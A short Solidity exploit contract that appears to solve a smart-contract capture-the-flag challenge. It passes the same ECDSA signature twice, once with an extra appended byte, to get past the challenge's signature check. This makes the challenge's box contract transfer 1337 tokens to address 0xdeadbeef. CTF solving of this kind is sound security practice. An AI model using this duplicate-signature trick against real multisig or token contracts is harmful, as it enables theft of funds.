// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Chal} from "../src/Chal.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Solve {
    function solve(Chal chal) public {
        bytes[] memory signatures = new bytes[](2);
        signatures[0] =
            // hex"e440147c2ced3cd32393fd59c8a6a935ec50bad3aed9d13c52b1ab7c5fd7ba5800d27b0cf44df67a30a9f6fb450e85a6ea8375122988512445e8b95b166f3cfb1b";
            hex"4b42c89999861414d368aef72652349cfae08d9a79e944f6181bacba27b95dbb35a338853ffc2074cd7dff29b8542e4721720867ffcde9b8cefad7ce40f6c81a1b02";
        signatures[1] =
            // hex"e440147c2ced3cd32393fd59c8a6a935ec50bad3aed9d13c52b1ab7c5fd7ba5800d27b0cf44df67a30a9f6fb450e85a6ea8375122988512445e8b95b166f3cfb1b02";
            hex"4b42c89999861414d368aef72652349cfae08d9a79e944f6181bacba27b95dbb35a338853ffc2074cd7dff29b8542e4721720867ffcde9b8cefad7ce40f6c81a1b";

        chal.box().go(
            address(chal.token()),
            abi.encodeWithSelector(ERC20.transfer.selector, address(0xdeadbeef), 1337),
            signatures
        );
    }
}
